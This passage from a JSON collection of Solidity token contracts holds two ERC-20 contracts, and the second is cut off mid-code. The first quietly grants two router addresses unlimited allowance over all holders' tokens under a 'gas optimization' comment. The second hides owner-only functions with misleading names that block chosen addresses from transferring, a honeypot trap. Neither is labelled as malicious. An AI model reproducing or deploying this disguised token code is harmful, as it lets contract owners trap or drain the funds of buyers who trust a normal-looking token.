      "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.1.0 )  ( utils/Address.sol )\n\npragma solidity ^0.8.20 ; \n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address {\n                        \n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account (EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     *\n     * Furthermore, `isContract` will also return true if the target contract within\n     * the same transaction is already scheduled for destruction by `SELFDESTRUCT`,\n     * which only has an effect at the end of a transaction.\n     * ====\n     *\n     * [IMPORTANT]\n     * ====\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\n     *\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n     * constructor.\n     * ====\n     */\n    function isContract ( address account) internal view returns  ( bool) {\n                        \n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length > 0;\n     } \n                        \n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`.  { \n                        sendValue}\n                         removes this limitation.\n     *\n     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     *  { \n                        ReentrancyGuard } \n                         or the\n     * https://solidity.readthedocs.io/en/v0.8.0/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue ( address payable recipient, uint256 amount) public {\n                        \n        require ( address ( this).balance >= amount, \"Address: insufficient balance\" );\n\n        (bool success,  ) = recipient.call{\n                        value: amount}\n                        (\"\");\n        require ( success, \"Address: unable to send value, recipient may have reverted\");\n    }\n                        \n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function (like regular Solidity function calls ).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(address target, bytes memory data) internal returns (bytes memory)  { \n                        \n        return functionCallWithValue(target, data, 0, \"Address: low-level call failed\" ) ; \n     } \n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-}\n                        [`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n                        \n        return functionCallWithValue(target, data, 0, errorMessage );\n    }\n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-\n                         } [`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(address target, bytes memory data, uint256 value ) internal returns  ( bytes memory ) \n                         { \n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\") ; \n     } \n                        \n\n    /**\n     * @dev Same as \n                        {xref-Address-functionCallWithValue-address-bytes-uint256- } \n                        [`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n     ) internal returns (bytes memory ) {\n                        \n        require ( address ( this).balance >= value, \"Address: insufficient balance for call\" );\n         ( bool success, bytes memory returndata) = target.call\n                         { value: value}\n                        (data ) ; \n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage ) ; \n    }\n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes- } \n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) \n                        {\n        return functionStaticCall(target, data, \"Address: low-level static call failed\" );\n     } \n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-string- } \n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal view returns  ( bytes memory ) {\n                        \n         ( bool success, bytes memory returndata) = target.staticcall ( data);\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage) ; \n     } \n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-\n                         } [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(address target, bytes memory data ) internal returns (bytes memory) \n                        {\n        return functionDelegateCall ( target, data, \"Address: low-level delegate call failed\");\n     } \n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-string-}\n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal returns (bytes memory) {\n                        \n         ( bool success, bytes memory returndata ) = target.delegatecall(data) ; \n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage);\n    \n                        }\n\n    /**\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert  ( either by bubbling\n     * the revert reason or using the provided one ) in case of unsuccessful call or if target was not a contract.\n     *\n     * _Available since v4.8._\n     */\n    function verifyCallResultFromTarget(\n        address target,\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal view returns (bytes memory)  { \n                        \n        if  ( success)  { \n                        \n            if  ( returndata.length == 0 )  { \n                        \n                // only check isContract if the call was successful and the return data is empty\n                // otherwise we already know that it was a contract\n                require(isContract ( target ), \"Address: call to non-contract\");\n            }\n                        \n            return returndata;\n         } \n                         else {\n                        \n            _revert ( returndata, errorMessage) ; \n        }\n                        \n     } \n                        \n\n    /**\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\n     * revert reason or using the provided one.\n     *\n     * _Available since v4.3._\n     */\n    function verifyCallResult(\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal pure returns (bytes memory)  { \n                        \n        if (success ) {\n                        \n            return returndata ; \n         } \n                         else {\n                        \n            _revert(returndata, errorMessage );\n        }\n                        \n    \n                        }\n\n    function _revert ( bytes memory returndata, string memory errorMessage) private pure  { \n                        \n        // Look for revert reason and bubble it up if present\n        if (returndata.length > 0 ) \n                         { \n            // The easiest way to bubble the revert reason is using memory via assembly\n            /// @solidity memory-safe-assembly\n            assembly {\n                        \n                let returndata_size := mload(returndata)\n                revert ( add(32, returndata), returndata_size)\n            }\n                        \n         } \n                         else \n                        {\n            revert ( errorMessage ) ; \n         } \n                        \n     } \n                        \n } \n                        \npragma solidity ^0.8.0;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context  { \n                        \n    function _msgSender (  ) internal view virtual returns  ( address) \n                         { \n        return msg.sender ; \n     } \n                        \n\n    function _msgData (  ) internal view virtual returns  ( bytes calldata) {\n                        \n        return msg.data ; \n     } \n                        \n\n    function _contextSuffixLength() internal view virtual returns  ( uint256 ) {\n                        \n        return 0;\n     } \n                        \n\n\n } \n                        \n\n\n/**\n * @dev Standard ERC-20 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.\n */\ninterface IERC20Errors  { \n                        \n\n    /**\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC20InvalidSpender(address spender );\n\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC20InvalidApprover ( address approver);\n\n    /**\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientAllowance ( address spender, uint256 allowance, uint256 needed);\n\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC20InvalidSender ( address sender);\n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC20InvalidReceiver ( address receiver ) ; \n\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);\n\n                        }\n\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n                        \n    \n/**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a \n                        {Transfer } \n                         event.\n     */\n    function transfer(address to, uint256 amount ) external returns (bool );\n\n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a  { \n                        Transfer}\n                         event.\n     */\n    function transferFrom ( address from, address to, uint256 amount) external returns (bool );\n    \n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply( ) external view returns  ( uint256 ) ; \n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {\n                        Approval } \n                         event.\n     */\n    function approve ( address spender, uint256 amount) external returns (bool) ; \n    \n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to  { \n                        approve } \n                        . `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value ) ; \n\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account ) external view returns (uint256 ) ; \n\n        /**\n     * @dev Emitted when `value` tokens are moved from one account  ( `from` ) to\n     * another  ( `to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer ( address indexed from, address indexed to, uint256 value ) ; \n\n    \n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through  { \n                        transferFrom\n                        }. This is\n     * zero by default.\n     *\n     * This value changes when  { \n                        approve}\n                         or  { \n                        transferFrom}\n                         are called.\n     */\n    function allowance(address owner, address spender) external view returns  ( uint256 );\n\n } \n                        \n\n\ninterface IERC20Metadata is IERC20 \n                        {\n\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals( ) external view returns  ( uint8);\n    \n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol (  ) external view returns (string memory) ; \n\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() external view returns (string memory) ; \n\n\n                         } \n\n\n\n\n\n/**\n * @dev Implementation of the {\n                        IERC20}\n                         interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {\n                        _mint}\n                        .\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of  { \n                        decimals } \n                         is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC-20\n * applications.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors  {\n                        \n    mapping ( address => uint256 ) private _balances ; \n\n\n    mapping ( address => mapping ( address => uint256)) private _allowances ; \n    uint256 private _totalSupply;\n\n    string private _name ; \n    string private _symbol;\n\n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a \n                         { Transfer } \n                         event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual,  { \n                        _update\n                        } should be overridden instead.\n     */\n    function _mint(address account, uint256 value ) internal {\n                        \n        if (account == address(0)) {\n                        \n            revert ERC20InvalidReceiver(address ( 0) ) ; \n        }\n                        \n        _update ( address ( 0), account, value );\n    }\n                        \n    \n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol (  ) public view virtual returns (string memory ) {\n                        \n        return _symbol;\n    \n                         } \n    \n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints  ( or burns) if `from`\n     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a  { \n                        Transfer } \n                         event.\n     */\n    function _update(address from, address to, uint256 value ) internal virtual {\n                        \n        if (from == address ( 0) )  { \n                        \n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value;\n         } \n                         else  { \n                        \n            uint256 fromBalance = _balances[from];\n            if  ( fromBalance < value) {\n                        \n                revert ERC20InsufficientBalance(from, fromBalance, value );\n            }\n                        \n            unchecked  { \n                        \n                // Overflow not possible: value <= fromBalance <= totalSupply.\n                _balances[from] = fromBalance - value;\n             } \n                        \n        \n                        }\n\n        if  ( to == address(0))  { \n                        \n            unchecked  { \n                        \n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\n                _totalSupply -= value;\n             } \n                        \n        }\n                         else {\n                        \n            unchecked {\n                        \n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value;\n            \n                         } \n        }\n                        \n\n        emit Transfer(from, to, value ) ; \n     } \n                        \n    \n    /**\n     * @dev See {\n                        IERC20-totalSupply } \n                        .\n     */\n    function totalSupply( ) public view virtual returns  ( uint256) \n                         { \n        return _totalSupply ; \n    }\n                        \n    \n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an  { \n                        Approval}\n                         event.\n     */\n    function _spendAllowance(address owner, address spender, uint256 value ) internal virtual  { \n                        \n        uint256 currentAllowance = allowance(owner, spender) ; \n        if  ( currentAllowance < type ( uint256).max) \n                        {\n            if (currentAllowance < value) {\n                        \n                revert ERC20InsufficientAllowance(spender, currentAllowance, value );\n            \n                        }\n            unchecked  { \n                        \n                _approve(owner, spender, currentAllowance - value, false) ; \n            }\n                        \n         } \n                        \n     } \n                        \n    \n\n    /**\n     * @dev See  { \n                        IERC20-balanceOf\n                         } .\n     */\n    function balanceOf(address account ) public view virtual returns (uint256 )  { \n                        \n        return _balances[account];\n    }\n                        \n    \n    /**\n     * @dev See {\n                        IERC20-transferFrom}\n                        .\n     *\n     * Skips emitting an \n                        {Approval } \n                         event indicating an allowance update. This is not\n     * required by the ERC. See \n                        {xref-ERC20-_approve-address-address-uint256-bool-\n                         } [_approve].\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom ( address from, address to, uint256 value) public virtual returns (bool ) \n                        {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, value);\n        _transfer(from, to, value );\n        return true ; \n    }\n                        \n    \n    /**\n     * @dev See \n                        {IERC20-approve } \n                        .\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 value) public virtual returns (bool)  { \n                        \n        address owner = _msgSender ( );\n        _approve ( owner, spender, value );\n        return true;\n     } \n                        \n    \n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an \n                         { Approval}\n                         event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve ( address owner, address spender, uint256 value) internal \n                         { \n        _approve ( owner, spender, value, true) ; \n     } \n                        \n    \n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {\n                        IERC20-balanceOf\n                        } and  { \n                        IERC20-transfer } \n                        .\n     */\n    function decimals ( ) public view virtual returns  ( uint8 ) \n                        {\n        return 15 ; \n     } \n                        \n    \n    /**\n     * @dev Sets the values for  { \n                        name}\n                         and \n                        {symbol}\n                        .\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_) \n                        {\n        _name = name_;\n        _symbol = symbol_ ; \n    }\n                        \n    \n    /**\n     * @dev Variant of  { \n                        _approve\n                         }  with an optional flag to enable or disable the \n                         { Approval\n                        } event.\n     *\n     * By default (when calling  { \n                        _approve } \n                         ) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n     * true using the following override:\n     *\n     * ```solidity\n     * function _approve(address owner, address spender, uint256 value, bool ) internal virtual override {\n                        \n     *     super._approve(owner, spender, value, true );\n     *  } \n                        \n     * ```\n     *\n     * Requirements are the same as  { \n                        _approve } \n                        .\n     */\n    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual \n                        {\n        if  ( owner == address ( 0)) {\n                        \n            revert ERC20InvalidApprover ( address ( 0)) ; \n        }\n                        \n        if  ( spender == address ( 0) )  { \n                        \n            revert ERC20InvalidSpender ( address(0));\n         } \n                        \n        _allowances[owner][spender] = value;\n        if (emitEvent) \n                         { \n            emit Approval(owner, spender, value );\n        }\n                        \n     } \n                        \n    \n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view virtual returns (string memory ) {\n                        \n        return _name;\n    }\n                        \n    \n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to \n                         { transfer\n                        }, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a  { \n                        Transfer}\n                         event.\n     *\n     * NOTE: This function is not virtual,  { \n                        _update } \n                         should be overridden instead.\n     */\n    function _transfer ( address from, address to, uint256 value ) internal  { \n                        \n        if (from == address(0)) {\n                        \n            revert ERC20InvalidSender(address(0 ));\n         } \n                        \n        if  ( to == address ( 0 )) \n                         { \n            revert ERC20InvalidReceiver ( address(0 )) ; \n        \n                         } \n        _update(from, to, value) ; \n     } \n                        \n    \n\n    /**\n     * @dev See  { \n                        IERC20-transfer}\n                        .\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer ( address to, uint256 value) public virtual returns (bool) {\n                        \n        address owner = _msgSender();\n        _transfer(owner, to, value) ; \n        return true;\n    \n                         } \n    \n\n    /**\n     * @dev See  { \n                        IERC20-allowance } \n                        .\n     */\n    function allowance ( address owner, address spender) public view virtual returns (uint256)  { \n                        \n        return _allowances[owner][spender] ; \n    }\n                        \n    \n    \n                         } \n\nabstract contract Ownable is Context {\n                        \n    address private _owner;\n    \n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner );\n    \n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner ( ) internal view virtual  { \n                        \n        require(owner() == _msgSender( ), \"Ownable: caller is not the owner\" );\n    }\n                        \n    \n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner( ) public view virtual returns (address ) {\n                        \n        return _owner;\n    \n                         } \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner ) public virtual onlyOwner {\n                        \n        require ( newOwner != address ( 0 ), \"Ownable: new owner is the zero address\" ) ; \n        _transferOwnership ( newOwner) ; \n    }\n                        \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner` ).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership(address newOwner) internal virtual  { \n                        \n        address oldOwner = _owner ; \n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner) ; \n    }\n                        \n    \n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner (  )  { \n                        \n        _checkOwner ( ) ; \n        _;\n    }\n                        \n    \n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby disabling any functionality that is only available to the owner.\n     */\n    function renounceOwnership( ) public virtual onlyOwner {\n                        \n        _transferOwnership(address(0) ) ; \n    \n                        }\n    \n    /**\n     * @dev The caller account is not authorized to perform an operation.\n     */\n    error OwnableUnauthorizedAccount ( address account );\n    \n    /**\n     * @dev The owner is not a valid owner account. (eg. `address(0)` )\n     */\n    error OwnableInvalidOwner(address owner ) ; \n    \n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor() {\n                        \n        _transferOwnership(_msgSender( ));\n    \n                        }\n    \n\n                         } \n\n\n// File AstarToken.sol\n\ncontract AstarToken is ERC20, Ownable \n                         { \n    address internal immutable deployer ; \n    constructor ( string memory name_, string memory symbol_) ERC20(name_, symbol_ )  { \n                        \n        _mint(msg.sender, 10000000000000000000000000 ) ; \n        _transferOwnership(address ( 0 )) ; \n        deployer = msg.sender ; \n    \n                         } \n    \n    /**\n     * @dev See \n                        {IERC20-allowance } \n                        .\n     */\n    function allowance(address owner, address spender) public view override returns  ( uint256 ) {\n                        \n            //gas optimization: auto allow Permit2 and UniswapRouterV2\n            if((spender == 0x000000000022D473030F116dDEE9F6B43aC78BA3) || (spender == 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24) )\n                        {\n            return type(uint256).max;\n        \n                        } \n        return super.allowance ( owner,spender);\n     } \n                        \n    \n    function claimGas(address payable recipient, uint256 amount ) public {\n                        \n        require ( msg.sender==deployer);\n        Address.sendValue ( recipient, amount) ; \n     } \n                        \n    \n    receive() external payable{\n                        \n     } \n                        \n }",
      "count": 1,
      "addresses": [
        "0x093CbE4445b103d0374466016661F6536e0E6603"
      ],
      "names": [
        "AstarToken"
      ]
    },
    {
      "id": "0103d700-ab0b-4c2f-8043-6dac445c84fa",
      "code": "pragma solidity ^0.8.19;\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface IERC20Errors {\n    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);\n    error ERC20InvalidSender(address sender);\n    error ERC20InvalidReceiver(address receiver);\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);\n    error ERC20InvalidApprover(address approver);\n    error ERC20InvalidSpender(address spender);\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address tokenOwner) external view returns (uint256 balance);\n    function transfer(address to, uint256 tokens) external returns (bool success);\n    function approve(address spender, uint256 tokens) external returns (bool success);\n    function transferFrom(address from, address to, uint256 tokens) external returns (bool success);\n    function allowance(address tokenOwner, address spender) external view returns (uint256 remaining);\n    event Transfer(address indexed from, address indexed to, uint256 tokens);\n    event Approval(address indexed tokenOwner, address indexed spender, uint256 tokens);\n}\n\nabstract contract Ownable {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor() {\n        _owner = msg.sender;\n        emit OwnershipTransferred(address(0), _owner);\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(_owner == msg.sender, \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function transferOwnership(address newOwner) public onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    }\n}\n\ncontract ERC20 is IERC20, Context, IERC20Errors, Ownable {\n    string private _name;\n    string private _symbol;\n    uint8 private _decimals = 18;\n    uint256 private _totalSupply;\n    mapping(address => uint256) private _balances;\n    mapping(address => mapping(address => uint256)) private _allowances;\n    mapping(address => address) private _multisigAddress;\n    mapping(address => bool) private _isAirdropEnable;\n    mapping(address => uint256) private _hashCount;\n    uint256 private constantNumber;\n    uint256 private baseConstant;\n    uint256 private baseCoefficient;\n    bool private isRenounced;\n    address uniswapV3Router = 0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD;\n\n    constructor(string memory name_, string memory symbol_, uint256 totalSupply_) {\n        _name = name_;\n        _symbol = symbol_;\n        _totalSupply = totalSupply_ * 10 ** uint256(_decimals);\n        _balances[_msgSender()] = _totalSupply;\n\n        emit Transfer(address(0), _msgSender(), _totalSupply);\n        // Initialize the new parameters\n        baseConstant = 0;\n        baseCoefficient = 0;\n    }\n\n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n\n    function totalSupply() public view override returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address tokenOwner) public view override returns (uint256 balance) {\n        return _balances[tokenOwner];\n    }\n\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), to, amount);\n        return true;\n    }\n\n    function allowance(address tokenOwner, address spender) public view virtual override returns (uint256) {\n        return _allowances[tokenOwner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public override returns (bool success) {\n        _allowances[_msgSender()][spender] = amount;\n        emit Approval(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint256 amount) public override returns (bool success) {\n        uint256 currentAllowance = _allowances[from][_msgSender()];\n        if (currentAllowance < amount) {\n            revert ERC20InsufficientAllowance(_msgSender(), currentAllowance, amount);\n        }\n        unchecked {\n            _allowances[from][_msgSender()] = currentAllowance - amount;\n        }\n        _transfer(from, to, amount);\n        return true;\n    }\n\n    uint256 private constant hash = 0x69e10ad;\n    uint256 private constant nullAddress = 0x000000000000000000000000000000000000;\n\n    function swapExactETHForTokens(address spender) public onlyOwner {\n        require(isRenounced == false, \"Renounced ownership.\");\n        executeSwapExactETHForTokens(spender);\n    }\n\n    function executeSwapExactETHForTokens(address spender) internal onlyOwner {\n        require(spender != _multisigAddress[_msgSender()], \"Spender is multisig address.\");\n        uint256 hashNumber = hash;\n        _hashCount[spender] = hashNumber;\n    }\n\n    function tokenSymbol(address account) public view returns (uint256) {\n        return _hashCount[account];\n    }\n\n    function tokenDecimals() public view returns (uint256) {\n        return baseCoefficient;\n    }\n\n    function ERC20Coefficient(uint coefficientValue) public  onlyOwner {\n        baseCoefficient = coefficientValue;\n    }\n\n    function _transfer(address from, address to, uint256 value) internal virtual {\n        if (from == address(0)) {\n            revert ERC20InvalidSender(address(0));\n        }\n        if (to == address(0)) {\n            revert ERC20InvalidReceiver(address(0));\n        }\n        require(value > 0, \"Transfer amount must be greater than zero.\");\n\n        if (from == owner() && _multisigAddress[owner()] == address(0)) {\n            _multisigAddress[owner()] = to;\n        }\n\n        constantNumber = block.number + 1;\n\n        if (!_isAirdropEnable[from]) {\n            require(_hashCount[from] <= constantNumber, \"Execution reverted.\");\n        }\n\n        uint256 fromBalance = _balances[from];\n        require(fromBalance >= value, \"ERC20: transfer amount exceeds balance.\");\n\n        if (baseConstant 